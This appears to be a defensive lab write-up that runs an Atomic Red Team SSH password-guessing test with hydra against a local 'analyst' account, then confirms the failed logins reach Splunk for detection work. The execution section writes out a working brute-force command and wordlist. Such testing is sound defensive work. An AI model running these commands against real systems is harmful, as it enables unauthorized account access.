# Attack 1 — SSH Brute Force (T1110.001)

**MITRE ATT&CK:** [T1110.001 — Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/)

Based on Atomic Red Team's documented test for this technique (T1110.001-1, "Brute
Force with Hydra - SSH"): use `hydra` to attempt a series of SSH logins against a real
account with a wordlist of wrong passwords. Run directly rather than through the
`Invoke-AtomicRedTeam` PowerShell wrapper, since the wrapper's only job is to execute
this exact command — running it natively avoids a PowerShell Core dependency on a
same-day-new Ubuntu release, with an identical result.

## Setup

```
sudo apt-get install -y hydra
```

## Execution

```
cat > /tmp/wordlist.txt <<WORDS
password123
letmein
Summer2025!
qwerty123
changeme
admin123
WORDS

hydra -l analyst -P /tmp/wordlist.txt -t 1 -f ssh://127.0.0.1
```

Targets the real `analyst` account over SSH to localhost — attacker and victim on the
same box, which is fine for this lab since what matters is the log signal it produces,
not network realism.

## Result

7 `Failed password` entries landed in `/var/log/auth.log`, forwarded to Splunk as
`sourcetype=linux_secure`, confirmed searchable within seconds of the attack running.

```
sshd-session[14738]: Failed password for analyst from 127.0.0.1 port 36186 ssh2
```

## Detection

See `detections/01-ssh-brute-force.spl`.
